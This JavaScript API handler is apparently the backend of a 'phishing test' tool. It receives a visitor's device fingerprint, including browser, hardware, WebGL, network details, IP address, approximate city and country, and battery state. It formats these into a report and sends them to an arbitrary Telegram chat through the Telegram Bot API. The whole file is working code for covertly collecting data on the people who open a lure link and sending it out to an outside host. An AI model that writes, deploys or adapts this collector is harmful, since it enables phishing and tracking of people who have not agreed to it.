export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, ...deviceInfo } = req.body;
    
    // Validate token expiration here (if stored in database)
    
    // Format the message with all collected data
    const messageText = `
📡 *New Phishing Test Report*

🆔 *Chat ID*: ${telegramId}
🕒 *Time*: ${new Date().toLocaleString()}

🌐 *Basic Info*
- Browser: ${deviceInfo.browser || 'N/A'}
- Platform: ${deviceInfo.platform || 'N/A'}
- Language: ${deviceInfo.language || 'N/A'}
- Timezone: ${deviceInfo.timezone || 'N/A'}

💻 *Hardware*
- CPU: ${deviceInfo.cpu || 'N/A'}
- RAM: ${deviceInfo.memory || 'N/A'}
- Screen: ${deviceInfo.screen || 'N/A'}
- WebGL: ${(deviceInfo.webgl?.vendor || 'N/A')} | ${(deviceInfo.webgl?.renderer || 'N/A')}

📶 *Network*
- Type: ${deviceInfo.network?.type || 'N/A'}
- Speed: ${deviceInfo.network?.effectiveType || 'N/A'}
- Downlink: ${deviceInfo.network?.downlink || 'N/A'} Mbps
- Latency (RTT): ${deviceInfo.network?.rtt || 'N/A'} ms
- Data Saver: ${deviceInfo.network?.saveData ? 'Enabled' : 'Disabled'}

📍 *Approximate Location* (IP-based, not accurate)
- IP: ${deviceInfo.ip || 'N/A'}
- City: ${deviceInfo.city || 'N/A'}
- Region: ${deviceInfo.region || 'N/A'}
- Country: ${deviceInfo.country || 'N/A'}

🔋 *Battery*
- Level: ${deviceInfo.battery ? `${deviceInfo.battery}%` : 'N/A'}
- Charging: ${deviceInfo.charging ? 'Yes' : 'No'}
    `;
    
    // Send to Telegram
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramId,
        text: messageText,
        parse_mode: 'Markdown' // Enable Markdown formatting
      })
    });
    
    res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Submission error:', error);
    res.status(500).json({ error: 'Failed to send to Telegram' });
  }
};
